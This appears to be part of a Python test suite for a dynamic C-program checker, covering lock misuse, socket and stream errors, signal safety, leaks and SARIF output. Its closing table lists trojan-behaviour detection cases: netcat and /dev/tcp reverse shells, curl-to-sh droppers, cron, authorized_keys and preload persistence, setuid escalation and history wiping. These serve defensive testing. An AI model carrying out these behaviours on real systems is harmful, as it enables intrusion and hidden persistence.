    "relock": ("double-lock", "relock", "a mutex it already holds"),
    "thread-exit": ("lock-leak", "keep_locked", "ends while holding"),
    "main-exit": ("lock-leak", "main_exit", "ends while holding"),
    "rw-inversion": ("lock-order-inversion", "b_then_write", "opposite order"),
    "read-inversion": ("lock-order-inversion", "read_inversion", "opposite order"),
    "cond-unlocked": ("unlocked-wait", "cond_unlocked", "does not hold"),
    "foreign-unlock": ("foreign-unlock", "release_other", "another thread holds"),
    "rw-upgrade": ("double-lock", "rw_upgrade", "holds for reading"),
    "spin-relock": ("double-lock", "spin_relock", "spin lock it already holds"),
    "spin-inversion": ("lock-order-inversion", "spin_inversion", "opposite order"),
    "destroy-held": ("destroy-locked", "destroy_held", "this thread holds"),
    "destroy-other": ("destroy-locked", "destroy_other", "a mutex that another thread holds"),
    "destroy-other-rw": ("destroy-locked", "destroy_other", "read-write lock that another"),
    "destroy-other-spin": ("destroy-locked", "destroy_other", "spin lock that another"),
    "lock-destroyed": ("use-after-destroy", "lock_destroyed", "locks a mutex that was destroyed"),
    "unlock-destroyed": ("use-after-destroy", "unlock_destroyed", "unlocks a mutex"),
    "wait-destroyed": ("use-after-destroy", "wait_destroyed", "waits with a mutex"),
}
# would hang forever: the checker stops the program (SIGABRT) after the report
STOPPED = {"relock", "rw-upgrade", "spin-relock"}


def check_lock_case(case):
    want_type, want_fn, want_text = LOCK_CASES[case]
    p, r = run_json(["dynamic", prog("locks"), case], timeout=60)
    expect(types(r) == [want_type], f"{case}: {types(r)}")
    f = r["findings"][0]
    expect(f.get("category") == "lock" and want_text in f["message"], f"{case}: {f}")
    expect(top(f, "access").get("function") == want_fn, f"{case}: {top(f, 'access')}")
    # A stop is SIGABRT, and a problem was reported: the error exitcode wins.
    if case in STOPPED:
        expect(r["target"]["signal"] == 6, f"{case}: {r.get('target')}")
    expect(p.returncode == 2, f"{case}: exit {p.returncode}")


for _case in LOCK_CASES:
    def _make_lock(case):
        def fn():
            check_lock_case(case)
        fn.__name__ = "lock_" + case.replace("-", "_")
        return fn
    test("dynamic")(_make_lock(_case))


@test("dynamic")
def locks_used_correctly_are_silent():
    # consistent orders, try-locks, recursive mutexes, condition waits, and
    # mutexes destroyed or freed and then made again at the same address
    p, r = run_json(["dynamic", prog("locks"), "clean"], timeout=60)
    expect(p.returncode == 0 and r["findings"] == [], types(r))
    # a freed block's mutex is gone: a new one at its address starts fresh
    p, r = run_json(["dynamic", "--quarantine-mb", "0", prog("locks"), "reuse"], timeout=60)
    expect(p.returncode == 0 and r["findings"] == [], f"exit {p.returncode}: {types(r)}")
    # pthread_atfork handlers unlock in a traced child what the parent's
    # thread locked before fork()
    p, r = run_json(["dynamic", "--trace-children", prog("locks"), "atfork"], timeout=60)
    expect(p.returncode == 0 and r["findings"] == [] and len(r["processes"]) == 2,
           f"exit {p.returncode}: {types(r)}")


@test("dynamic")
def lock_orphaned_by_fork():
    # another thread holds b when the process forks; the child (not traced)
    # locks it and would wait forever: reported from the child, which is
    # stopped, while the parent carries on
    p, r = run_json(["dynamic", prog("locks"), "orphan-fork"], timeout=60)
    expect(p.returncode == 2 and types(r) == ["orphaned-lock"], f"exit {p.returncode}: {types(r)}")
    f = r["findings"][0]
    expect(f.get("category") == "lock" and "another thread of the parent held" in f["message"], f)
    expect(top(f, "access").get("function") == "orphan_child", top(f, "access"))
    # nothing held at fork(): the child locks freely, traced or not
    for extra in ([], ["--trace-children"]):
        p, r = run_json(["dynamic"] + extra + [prog("locks"), "fork-free"], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{extra}: exit {p.returncode}: {types(r)}")


@test("dynamic")
def lock_mutex_as_signal_is_not_a_relock():
    # the worker unlocks main's mutex (foreign-unlock). glibc releases a
    # normal mutex anyway, so main's second lock takes it and returns;
    # it must not be reported as a double-lock or stop the program
    p, r = run_json(["dynamic", prog("locks"), "mutex-signal"], timeout=60)
    expect(p.returncode == 2 and types(r) == ["foreign-unlock"],
           f"exit {p.returncode}: {types(r)}")
    expect(r["target"]["status"] == "exited" and r["target"]["exit_code"] == 0, r["target"])
    expect(top(r["findings"][0], "access").get("function") == "release_other", r["findings"][0])


@test("dynamic")
def lock_orphaned_by_fork_is_not_a_relock():
    # the forking thread's own lock, taken again in the traced child, is a
    # double lock (not an orphan: its owner is the child's only thread)
    p, r = run_json(["dynamic", "--trace-children", prog("locks"), "fork-relock"], timeout=60)
    expect(p.returncode == 2 and types(r) == ["double-lock"], f"exit {p.returncode}: {types(r)}")
    expect(top(r["findings"][0], "access").get("function") == "fork_relock", r["findings"][0])
    # an untraced child that deadlocks is stopped, and says why
    p, r = run_json(["dynamic", prog("locks"), "fork-relock"], timeout=60)
    expect(p.returncode == 2 and types(r) == ["double-lock"], f"untraced: exit {p.returncode}: {types(r)}")


@test("dynamic")
def lock_orphaned_by_thread_exit():
    # a thread ended holding c (a lock-leak); locking it again hangs: stopped
    p, r = run_json(["dynamic", prog("locks"), "orphan-thread"], timeout=60)
    expect(p.returncode == 2, f"exit {p.returncode}")
    expect(r["target"]["signal"] == 6, r.get("target"))
    expect(sorted(types(r)) == ["lock-leak", "orphaned-lock"], types(r))
    f = [x for x in r["findings"] if x["type"] == "orphaned-lock"][0]
    expect("owner has ended" in f["message"] or "owner thread has ended" in f["message"], f)
    expect(top(f, "access").get("function") == "orphan_thread", top(f, "access"))


UNSAFE_LIBC = {
    # case: the function named in the message
    "strtok": "strtok()",
    "localtime": "localtime()",
    "getpwuid": "getpwuid()",
}


def check_unsafe_libc(case):
    p, r = run_json(["dynamic", prog("unsafe_libc"), case], timeout=60)
    expect(p.returncode == 2 and types(r) == ["thread-unsafe-call"], f"{case}: exit {p.returncode}: {types(r)}")
    f = r["findings"][0]
    expect(f.get("category") == "thread" and f["message"].startswith(UNSAFE_LIBC[case]), f"{case}: {f}")
    expect(top(f, "access").get("function") == "call", f"{case}: {top(f, 'access')}")
    expect(top(f, "alloc").get("function") == "call", f"{case}: first caller {top(f, 'alloc')}")


for _case in UNSAFE_LIBC:
    def _make_unsafe(case):
        def fn():
            check_unsafe_libc(case)
        fn.__name__ = "unsafe_libc_" + case
        return fn
    test("dynamic")(_make_unsafe(_case))


@test("dynamic")
def unsafe_libc_used_safely_is_silent():
    # the _r variant, one lock around the calls, one thread only, and a first
    # caller that has ended before the next one starts
    for case in ("reentrant", "locked", "single", "sequential"):
        p, r = run_json(["dynamic", prog("unsafe_libc"), case], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


@test("dynamic")
def sigpipe_exposure_reported_once_per_run():
    # "late": ignored first, back to the default afterwards. "thread": main
    # blocks the signal, the worker started earlier has not.
    # No sendmmsg on Darwin: the program falls back to sendmsg there.
    pairs = (("send", "main"), ("sendto", "main"), ("sendmsg", "main"),
             ("sendmmsg", "main"),
             ("late", "main"), ("thread", "worker"), ("threads", "worker"))
    if IS_DARWIN:
        pairs = tuple(p for p in pairs if p[0] != "sendmmsg")
    for case, where in pairs:
        p, r = run_json(["dynamic", prog("sigpipe"), case], timeout=60)
        expect(p.returncode == 2 and types(r) == ["sigpipe-exposure"], f"{case}: exit {p.returncode}: {types(r)}")
        f = r["findings"][0]
        prefix = "sendmmsg() without MSG_NOSIGNAL" if case == "sendmmsg" else "send() without MSG_NOSIGNAL"
        expect(f["message"].startswith(prefix), f"{case}: {f['message']}")
        expect(top(f, "access").get("function") == where, f"{case}: {top(f, 'access')}")


@test("dynamic")
def sigpipe_blocked_after_the_first_look_is_not_a_second_report():
    # The first send sees default SIGPIPE and is the one report. The thread
    # then blocks it; the later send is not another finding.
    p, r = run_json(["dynamic", prog("sigpipe"), "block_after"], timeout=60)
    expect(p.returncode == 2 and types(r) == ["sigpipe-exposure"],
           f"exit {p.returncode}: {types(r)}")


@test("dynamic")
def sigpipe_unblocked_after_a_blocked_look():
    # First send while blocked fills the look and stays quiet. Unblocking
    # must be noticed, or the later send is a miss.
    p, r = run_json(["dynamic", prog("sigpipe"), "unblock_after"], timeout=60)
    expect(p.returncode == 2 and types(r) == ["sigpipe-exposure"],
           f"exit {p.returncode}: {types(r)}")


@test("dynamic")
def sigpipe_exposure_silent_when_sigpipe_cannot_kill():
    # MSG_NOSIGNAL, SIGPIPE ignored, handled or blocked, and a datagram socket
    # (write() on a pipe is meant to kill its writer: not a socket)
    # (and a socket's number reopened as another file by a call the runtime does not see)
    for case in ("nosignal", "ignored", "handled", "blocked", "datagram", "write_pipe",
                 "write_ignored", "write_reopened", "writev_pipe", "writev_ignored",
                 "sendmmsg_nosignal", "sendfile_file", "dprintf_file"):
        p, r = run_json(["dynamic", prog("sigpipe"), case], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


@test("dynamic")
def sigpipe_exposure_write_on_a_socket():
    # a socketpair end, the connecting side, and the side accept() and accept4() made
    for case in ("write", "write_client", "write_accepted", "write_accept4", "writev", "sendfile",
                 "dprintf", "vdprintf"):
        p, r = run_json(["dynamic", prog("sigpipe"), case], timeout=60)
        expect(p.returncode == 2 and types(r) == ["sigpipe-exposure"], f"{case}: exit {p.returncode}: {types(r)}")
        f = r["findings"][0]
        prefix = ("sendfile() on a socket while SIGPIPE" if case == "sendfile"
                  else "writev() on a socket while SIGPIPE" if case == "writev"
                  else "dprintf() on a socket while SIGPIPE" if case == "dprintf"
                  else "vdprintf() on a socket while SIGPIPE" if case == "vdprintf"
                  else "write() on a socket while SIGPIPE")
        expect(f["message"].startswith(prefix), f"{case}: {f['message']}")
        expect(top(f, "access").get("function") == ("call_vdprintf" if case == "vdprintf" else "main"),
               f"{case}: {top(f, 'access')}")


@test("dynamic")
def sockets_use_after_close_on_a_closed_descriptor():
    # Darwin has no 64-bit pread aliases, preadv2/pwritev2, copy_file_range,
    # splice or accept4: the program compiles those branches out.
    calls = ("write", "writev", "read", "readv", "pread", "pread64", "pwrite",
             "pwrite64", "preadv", "preadv64", "pwritev", "pwritev64",
                 "preadv2", "preadv64v2", "pwritev2", "pwritev64v2",
                 "send", "sendfile", "copy_file_range", "splice", "recv", "shutdown", "connect", "listen", "accept",
                 "accept4", "flock", "fdopendir", "dprintf", "vdprintf")
    if IS_DARWIN:
        calls = tuple(c for c in calls
                      if c not in ("pread64", "pwrite64", "preadv64", "pwritev64",
                                   "preadv2", "preadv64v2", "pwritev2", "pwritev64v2",
                                   "copy_file_range", "splice", "accept4"))
    for call in calls:
        p, r = run_json(["dynamic", prog("sockets"), "closed_" + call], timeout=60)
        expect(p.returncode == 2 and types(r) == ["use-after-close"], f"{call}: exit {p.returncode}: {types(r)}")
        f = r["findings"][0]
        expect(f["message"].startswith(f"{call}() on file descriptor"), f"{call}: {f['message']}")
        expect(f["category"] == "fd" and f["severity"] == "error", f"{call}: {f}")
        for stack in ("access", "alloc", "free"):  # used here, opened and closed in main
            want = "call_vdprintf" if call == "vdprintf" and stack == "access" else "main"
            expect(top(f, stack).get("function") == want, f"{call}: {stack}: {top(f, stack)}")


@test("dynamic")
def sockets_use_after_close_silent_when_nothing_was_closed():
    # an open descriptor, a number nobody opened, and a number that was
    # closed and then opened again as another file (also by a call the runtime
    # does not see: read() then fails with EISDIR, which is not EBADF)
    # (a close the runtime did not see leaves the record open: not judged)
    # (Darwin cannot hide close(): every libc call is interposed.)
    cases = ("open_ok", "never_open", "reused", "reused_untracked", "behind_the_back",
             "accept_eagain")
    if IS_DARWIN:
        cases = tuple(c for c in cases if c != "behind_the_back")
    for case in cases:
        p, r = run_json(["dynamic", prog("sockets"), case], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


@test("dynamic")
def sockets_nonblocking_recv_loop_is_an_eagain_spin():
    p, r = run_json(["dynamic", prog("sockets"), "eagain"], timeout=60)
    expect(p.returncode == 2 and types(r) == ["socket-eagain-spin"],
           f"exit {p.returncode}: {types(r)}")
    f = r["findings"][0]
    expect("returned EAGAIN 1000 times" in f["message"], f["message"])


@test("dynamic")
def sockets_read_loop_that_ignores_end_of_file():
    for case in ("eof_read", "eof_recv"):
        p, r = run_json(["dynamic", prog("sockets"), case], timeout=60)
        expect(p.returncode == 2 and types(r) == ["socket-eof-spin"], f"{case}: exit {p.returncode}: {types(r)}")
        f = r["findings"][0]
        expect("1000 times in a row on socket" in f["message"], f"{case}: {f['message']}")
        expect(top(f, "access").get("function") == "main", f"{case}: {top(f, 'access')}")


@test("dynamic")
def sockets_read_loop_silent_when_it_stops_or_is_not_a_socket():
    # stops at the first 0; 600 zeros on one socket and 600 on the next that
    # got the same number; /dev/null read 2000 times; reads of length 0; empty
    # datagrams, which also read as 0
    for case in ("eof_once", "eof_short", "file_at_end", "zero_length", "dgram_empty"):
        p, r = run_json(["dynamic", prog("sockets"), case], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


@test("dynamic")
def sockets_leak_report_says_why_the_socket_was_never_used():
    for case, why in (("leak_connect", "(its connect() failed: Connection refused)"),
                      ("leak_bind", "(its bind() failed: Address already in use)"),
                      ("leak_listen", "(its listen() failed: Operation not supported)"),
                      ("leak_nonblocking", None), ("leak_plain", None), ("leak_reused", None)):
        p, r = run_json(["dynamic", prog("sockets"), case], timeout=60)
        leaks = [f for f in r["findings"] if f["type"] == "resource-leak"]
        expect(len(leaks) == 1, f"{case}: {types(r)}")
        msg = leaks[0]["message"]
        expect(msg.endswith("is still open when the program ends" + (" " + why if why else "")), f"{case}: {msg}")


@test("dynamic")
def sockets_descriptor_limit_names_the_call_site_that_leaks():
    # (call that failed, function that made most of the open descriptors)
    for call, opener in (("open", "leak_open"), ("socket", "leak_socket"), ("pipe", "leak_pipe"),
                         ("fopen", "leak_fopen")):
        # the limit is set before the program starts, like a service's ulimit
        p, r = run_json(["dynamic", "/bin/bash", "-c", f"ulimit -n 40; exec {prog('sockets')} exhaust_{call}"],
                        timeout=60)
        hits = [f for f in r["findings"] if f["type"] == "descriptor-limit"]
        expect(p.returncode == 2 and len(hits) == 1, f"{call}: exit {p.returncode}: {types(r)}")
        f = hits[0]
        expect(f["severity"] == "error" and f["category"] == "fd", f"{call}: {f}")
        expect(f["message"].startswith(f"{call}() failed: the process is out of file descriptors (limit 40, "),
               f"{call}: {f['message']}")
        expect(f"come from {call}() at the" in f["message"], f"{call}: {f['message']}")
        expect(top(f, "access").get("function") == opener, f"{call}: failed in {top(f, 'access')}")
        expect(top(f, "alloc").get("function") == opener, f"{call}: most opened in {top(f, 'alloc')}")
        # the runtime still works with every descriptor taken: the leaks are
        # reported at exit too, and the heap scan (which reads /proc/self/maps to
        # know what is reachable) found the one 77-byte block and nothing more
        expect(any(x["type"] == "resource-leak" for x in r["findings"]), f"{call}: no leak report: {types(r)}")
        expect(leak_totals(r) == {"definite": (1, 77)}, f"{call}: heap scan: {leak_totals(r)}")


@test("dynamic")
def sockets_bind_without_reuseaddr_is_a_warning_per_call_site():
    p, r = run_json(["dynamic", prog("sockets"), "bind_plain"], timeout=60)
    expect(p.returncode == 2 and types(r) == ["bind-without-reuseaddr"], f"exit {p.returncode}: {types(r)}")
    f = r["findings"][0]
    expect(f["severity"] == "warning" and f["message"].startswith("bind() to TCP port 40871 without SO_REUSEADDR"), f)
    expect(top(f, "access").get("function") == "listen_on", top(f, "access"))
    p, r = run_json(["dynamic", prog("sockets"), "bind_ipv6"], timeout=60)
    expect(types(r) == ["bind-without-reuseaddr"], f"ipv6: {types(r)}")
    # listen_on() called from three lines of main, one of them in a loop of two
    p, r = run_json(["dynamic", prog("sockets"), "bind_sites"], timeout=60)
    expect(types(r) == ["bind-without-reuseaddr"] * 3, f"sites: {types(r)}")


@test("dynamic")
def sockets_bind_without_reuseaddr_silent_when_not_a_fixed_tcp_port():
    for case in ("bind_reuse", "bind_reuseport", "bind_port0", "bind_udp", "bind_unix"):
        p, r = run_json(["dynamic", prog("sockets"), case], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


@test("dynamic")
def sockets_select_past_fd_setsize():
    for case, how in (("select_big", "select()"), ("select_loop", "select()"),
                      ("pselect_big", "pselect()")):
        p, r = run_json(["dynamic", prog("sockets"), case], timeout=60)
        expect(p.returncode == 2 and types(r) == ["select-overflow"], f"{case}: exit {p.returncode}: {types(r)}")
        f = r["findings"][0]
        expect(f["message"].startswith(f"{how} with nfds "), f"{case}: {f['message']}")
        expect("past FD_SETSIZE" in f["message"], f"{case}: {f['message']}")
        expect(f["severity"] == "error" and f["category"] == "fd", f"{case}: {f}")
        expect(top(f, "access").get("function") == "main", f"{case}: {top(f, 'access')}")
        if case == "select_loop":
            expect(f["occurrences"] == 2, f"{case}: {f}")


@test("dynamic")
def sockets_select_silent_when_nfds_is_in_range():
    for case in ("select_ok", "select_edge", "pselect_ok"):
        p, r = run_json(["dynamic", prog("sockets"), case], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


@test("dynamic")
def streams_fcloseall_then_use_is_use_after_close():
    p, r = run_json(["dynamic", prog("resources"), "fcloseall"], timeout=60)
    expect(p.returncode == 2 and types(r) == ["use-after-close"],
           f"exit {p.returncode}: {types(r)}")
    f = r["findings"][0]
    expect(f["message"].startswith("fread() on a FILE stream"), f["message"])
    expect(top(f, "access").get("function") == "fcloseall_use", top(f, "access"))


@test("dynamic")
def streams_use_after_fclose():
    for case, how in (("stream-fread", "fread()"), ("stream-fwrite", "fwrite()"),
                      ("stream-fgets", "fgets()"), ("stream-fgetc", "fgetc()"),
                      ("stream-fscanf", "fscanf()"), ("stream-vfscanf", "vfscanf()"),
                      ("stream-fputc", "fputc()"), ("stream-fprintf", "fprintf()"),
                      ("stream-fputs", "fputs()"), ("stream-fflush", "fflush()"),
                      ("stream-getline", "getline()"), ("stream-getdelim", "getdelim()"),
                      ("stream-fseek", "fseek()"), ("stream-fseeko", "fseeko()"),
                      ("stream-ftell", "ftell()"), ("stream-ftello", "ftello()"),
                      ("stream-rewind", "rewind()"), ("stream-ungetc", "ungetc()"),
                      ("stream-fileno", "fileno()")):
        p, r = run_json(["dynamic", prog("resources"), case], timeout=60)
        expect(p.returncode == 2 and types(r) == ["use-after-close"], f"{case}: exit {p.returncode}: {types(r)}")
        f = r["findings"][0]
        expect(f["message"].startswith(f"{how} on a FILE stream"), f"{case}: {f['message']}")
        expect(f["category"] == "stream" and f["severity"] == "error", f"{case}: {f}")
        fn = case.replace("-", "_")
        for stack in ("access", "alloc", "free"):
            want = "call_vfscanf" if case == "stream-vfscanf" and stack == "access" else fn
            expect(top(f, stack).get("function") == want, f"{case}: {stack}: {top(f, stack)}")


@test("dynamic")
def dirs_use_after_closedir():
    for case, how in (("dir-readdir", "readdir()"), ("dir-rewinddir", "rewinddir()"),
                      ("dir-seekdir", "seekdir()"), ("dir-telldir", "telldir()")):
        p, r = run_json(["dynamic", prog("resources"), case], timeout=60)
        expect(p.returncode == 2 and types(r) == ["use-after-close"], f"{case}: exit {p.returncode}: {types(r)}")
        f = r["findings"][0]
        expect(f["message"].startswith(f"{how} on a directory"), f"{case}: {f['message']}")
        expect(top(f, "access").get("function") == case.replace("-", "_"), f"{case}: {top(f, 'access')}")


@test("dynamic")
def streams_use_after_fclose_silent_when_the_stream_is_open_or_new():
    # an open stream (and stderr, which was never closed), and a stream opened
    # again after fclose (a new FILE*, even when the address is reused)
    for case in ("stream-ok", "stream-reused"):
        p, r = run_json(["dynamic", prog("resources"), case], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


SIGNAL_CASES = {
    # case: (call named in the message, handler function)
    "malloc": ("malloc()", "allocates"),
    "printf": ("printf()", "prints"),
    "exit": ("exit()", "exits"),
}


def check_signal_case(case):
    want_call, want_fn = SIGNAL_CASES[case]
    p, r = run_json(["dynamic", prog("signals"), case], timeout=60)
    expect(p.returncode == 2, f"{case}: exit {p.returncode}")
    # one report per run of the handler: not also free() or printf's malloc()
    expect(types(r) == ["signal-unsafe-call"], f"{case}: {types(r)}")
    f = r["findings"][0]
    expect(f["message"].startswith(want_call) and f.get("category") == "signal", f"{case}: {f}")
    expect(top(f, "access").get("function") == want_fn, f"{case}: {top(f, 'access')}")
    expect(top(f, "alloc").get("function") == "install", f"{case}: {top(f, 'alloc')}")


for _case in SIGNAL_CASES:
    def _make_signal(case):
        def fn():
            check_signal_case(case)
        fn.__name__ = "signal_" + case
        return fn
    test("dynamic")(_make_signal(_case))


@test("dynamic")
def signal_handlers_that_are_safe_are_silent():
    # flags and write() only; the old handler is handed back as the program's
    # own; a handler left with siglongjmp no longer counts
    p, r = run_json(["dynamic", prog("signals"), "clean"], timeout=60)
    expect(p.returncode == 0 and r["findings"] == [], f"exit {p.returncode}: {types(r)}")


DANGLING = {"LEAKCHECK_DANGLING": "1"}


@test("dynamic")
def dangling_pointer_in_a_live_block():
    p, r = run_json(["dynamic", prog("dangling"), "block"], env=DANGLING)
    expect(p.returncode == 2 and types(r) == ["dangling-pointer"], f"exit {p.returncode}: {types(r)}")
    f = r["findings"][0]
    expect(f["severity"] == "warning" and "16-byte block still in use (at offset 8)" in f["message"], f)
    # the node that still points, then the freed one: allocated and freed where
    expect(top(f, "access").get("function") == "make", top(f, "access"))
    expect(top(f, "free").get("function") == "in_block", top(f, "free"))
    expect(f["stacks"]["alloc"][1].get("function") == "in_block", f["stacks"]["alloc"])
    # off unless asked for
    _, r = run_json(["dynamic", prog("dangling"), "block"])
    expect(r["findings"] == [], types(r))


@test("dynamic")
def dangling_pointer_in_a_global():
    # the program allocates nothing else: the check must still run
    p, r = run_json(["dynamic", prog("dangling"), "global"], env=DANGLING)
    expect(types(r) == ["dangling-pointer"], types(r))
    expect("a global variable at " in r["findings"][0]["message"], r["findings"][0])


@test("dynamic")
def pointers_cleared_after_free_are_silent():
    # cleared, replaced, or only a stale copy on the stack
    p, r = run_json(["dynamic", prog("dangling"), "clean"], env=DANGLING)
    expect(p.returncode == 0 and r["findings"] == [], f"exit {p.returncode}: {types(r)}")


@test("dynamic")
def inherited_by_untraced_children_reported_once():
    # three fork()+execlp() children, none traced: one finding, seen 3 times
    p, r = run_json(["dynamic", prog("resources"), "inherit-exec"])
    expect(types(r) == ["inherited-descriptor"], types(r))
    expect(r["findings"][0]["occurrences"] == 3, r["findings"][0])
    expect(len(r["processes"]) == 1, r["processes"])  # no stream of their own


@test("dynamic")
def resources_released_correctly_are_silent():
    p, r = run_json(["dynamic", prog("resources"), "clean"])
    expect(p.returncode == 0 and r["findings"] == [], types(r))


@test("dynamic")
def freopen_failure_is_not_a_stream_leak():
    # glibc abandons the FILE object (a memory-leak). The stream itself was closed.
    p, r = run_json(["dynamic", prog("resources"), "freopen-fail"])
    expect("resource-leak" not in types(r) and "use-after-close" not in types(r), types(r))


@test("dynamic")
def resource_leak_details():
    # The DIR's buffer is part of the same bug, not a second memory leak.
    _, r = run_json(["dynamic", prog("resources"), "leak-dir"])
    expect(any("reported with it" in n for n in r["notes"]), r["notes"])
    # Leaks are judged with the other leaks: --no-leak-check skips them.
    p, r = run_json(["dynamic", "--no-leak-check", prog("resources"), "leak-fd"])
    expect(p.returncode == 0 and r["findings"] == [], types(r))
    p = run(["dynamic", prog("resources"), "leak-fd"])
    expect("WARNING resource-leak (file descriptor)" in p.stdout and "opened here:" in p.stdout,
           p.stdout)


@test("dynamic")
def stress_is_clean():
    p, r = run_json(["dynamic", prog("stress"), "200000"])
    expect(p.returncode == 0 and r["findings"] == [], types(r))
    heap = r["processes"][0]["heap"]
    expect(heap["allocations"] >= 200000 and heap["live_blocks_at_exit"] < 50, heap)


@test("dynamic")
def abort_on_error_stops_at_first():
    p, r = run_json(["dynamic", "--abort-on-error", prog("heap_errors"), "double-free", "double-free"])
    expect(p.returncode == 2, f"exit {p.returncode}")
    expect(r["target"]["status"] == "signaled" and r["target"]["signal"] == 6, r["target"])
    expect(types(r) == ["double-free"], types(r))


@test("dynamic")
def suppressions_and_exit_codes():
    with tempfile.NamedTemporaryFile("w", suffix=".supp", delete=False) as s:
        s.write("# comment\ndouble-free:double_free\nleak:lose_*\n")
        supp = s.name
    try:
        p, r = run_json(["dynamic", "-s", supp, prog("heap_errors"), "double-free"])
        expect(p.returncode == 0 and r["findings"] == [], types(r))
        expect(any("suppressed" in n for n in r["notes"]), r["notes"])
        _, r = run_json(["dynamic", "-s", supp, prog("leaks")])
        expect(leak_totals(r).get("definite") is None, leak_totals(r))
    finally:
        os.unlink(supp)
    p, _ = run_json(["dynamic", "--error-exitcode", "9", prog("leaks")])
    expect(p.returncode == 9, f"exit {p.returncode}")
    # A leak that exits 1 is the error code, not 1. A clean exit of 2 stays 2.
    p, r = run_json(["dynamic", prog("leaks"), "1"])
    expect(p.returncode == 2 and leak_totals(r).get("definite"), f"exit {p.returncode}: {types(r)}")
    p, _ = run_json(["dynamic", "--error-exitcode", "9", prog("leaks"), "1"])
    expect(p.returncode == 9, f"exit {p.returncode}")
    p, r = run_json(["dynamic", prog("no_bugs"), "2"])
    expect(p.returncode == 2 and r["findings"] == [], f"exit {p.returncode}: {types(r)}")
    with tempfile.NamedTemporaryFile("w", suffix=".supp", delete=False) as s:
        s.write("no colon here\n")
        bad = s.name
    try:
        # A bad suppression file is a config problem: exit 3, and the target
        # is not run at all.
        p = run(["dynamic", "-s", bad, prog("no_bugs")])
        expect(p.returncode == 3 and "expected <type>:<pattern>" in p.stderr, p.stderr)
        expect("hello" not in p.stdout, p.stdout)
    finally:
        os.unlink(bad)


@test("dynamic")
def console_and_sarif_formats():
    p = run(["dynamic", prog("heap_errors"), "double-free"])
    expect("ERROR double-free" in p.stdout and "== Summary ==" in p.stdout, p.stdout)
    expect("first released here:" in p.stdout and "heap_errors.c:" in p.stdout, p.stdout)
    p, r = run_json(["dynamic", prog("leaks")])
    with tempfile.NamedTemporaryFile(suffix=".sarif", delete=False) as f:
        path = f.name
    try:
        run(["-f", "sarif", "-o", path, "dynamic", prog("leaks")])
        sarif = json.load(open(path))
    finally:
        os.unlink(path)
    check_sarif(sarif, len(r["findings"]))


def check_sarif(sarif, n_results):
    expect(sarif["version"] == "2.1.0" and "$schema" in sarif, "SARIF header")
    run_ = sarif["runs"][0]
    rule_ids = [x["id"] for x in run_["tool"]["driver"]["rules"]]
    expect(len(run_["results"]) == n_results, f"{len(run_['results'])} results, want {n_results}")
    for res in run_["results"]:
        expect(res["ruleId"] in rule_ids, res["ruleId"])
        expect(rule_ids[res["ruleIndex"]] == res["ruleId"], "ruleIndex")
        expect(res["level"] in ("error", "warning", "note"), res["level"])
        expect(res["message"]["text"], "message")
        loc = res["locations"][0]["physicalLocation"]
        expect(loc["artifactLocation"]["uri"] and loc["region"]["startLine"] > 0, loc)


# What a trojan does (tests/dynamic/programs/behavior.c): case, finding, and a
# piece of its message.
BEHAVIOR = [
    ("shell_socket", "reverse-shell", "with its standard input or output on a network socket"),
    ("shell_c_reverse", "reverse-shell", "opens a shell on a network connection"),
    ("cmd_dev_tcp", "reverse-shell", "system() runs a command that opens a shell on a network connection"),
    ("cmd_netcat", "reverse-shell", "(netcat)"),
    ("cmd_fifo", "reverse-shell", "connects a named pipe to netcat"),
    ("cmd_script", "reverse-shell", "opens a socket and starts a shell"),
    ("cmd_curl_sh", "dropper", "downloads or decodes code and runs it at once"),
    ("cmd_base64_sh", "dropper", "popen() runs a command that downloads or decodes code"),
    ("cmd_chmod_tmp", "dropper", "makes a file in a temporary directory executable"),
    ("dropper_exec", "dropper", "a file this program has written itself"),
    ("dropper_dlopen", "dropper", "dlopen() loads"),
    ("dropper_dlmopen", "dropper", "dlmopen() loads"),
    ("cmd_crontab", "persistence", "installs a cron job"),
    ("cmd_systemctl", "persistence", "enables a service"),
    ("cmd_bashrc", "persistence", "appends to a shell start-up file"),
    ("persist_bashrc", "persistence", "for writing: a shell start-up file"),
    ("persist_authorized_keys", "persistence", "the keys that may log in without a password"),
    ("persist_mkstemp", "persistence", "the keys that may log in without a password"),
    ("persist_cron", "persistence", "a cron job"),
    ("persist_preload", "persistence", "a library loaded into every program"),
    ("persist_rename", "persistence", "rename() puts a file at"),
    ("persist_symlink", "persistence", "symlink() puts a file at"),
    ("cmd_setuid", "privilege-escalation", "sets the setuid bit"),
    ("chmod_setuid", "privilege-escalation", "chmod() sets the setuid or setgid bit"),
    ("iopl_on", "privilege-escalation", "iopl() asks for direct access to hardware ports"),
    ("cap_set", "privilege-escalation", "capset() changes the process's capabilities"),
    ("path_tmp", "command-injection", "setenv() puts \"/tmp\" first on PATH"),
    ("hist_file", "log-tampering", "setenv() turns off the shell history"),
    ("hist_size", "log-tampering", "setenv() turns off the shell history"),
    ("hist_put", "log-tampering", "putenv() turns off the shell history"),
    ("path_dot", "command-injection", "setenv() puts \".\" first on PATH"),
    ("path_putenv", "command-injection", "putenv() puts \"/var/tmp\" first on PATH"),
    ("path_unset", "command-injection", "unsetenv() clears PATH"),
    ("lib_path_tmp", "process-injection", "setenv() puts \"/tmp\" first on the library search path"),
    ("cap_raise", "privilege-escalation", "prctl(PR_CAP_AMBIENT_RAISE) changes the process's capabilities"),
    ("ioperm_on", "privilege-escalation", "ioperm() asks for direct access to hardware ports"),
    ("chmod_world", "insecure-permissions", "chmod() makes the file writable by every user"),
    ("open_world", "insecure-permissions", "open() creates the file writable by every user"),
    ("open_setuid", "privilege-escalation", "open() sets the setuid or setgid bit"),
    ("mkdir_world", "insecure-permissions", "mkdir() creates the directory writable by every user"),
    ("mkfifo_world", "insecure-permissions", "mkfifo() creates the pipe writable by every user"),
    ("mknod_world", "insecure-permissions", "mknod() creates the node writable by every user"),
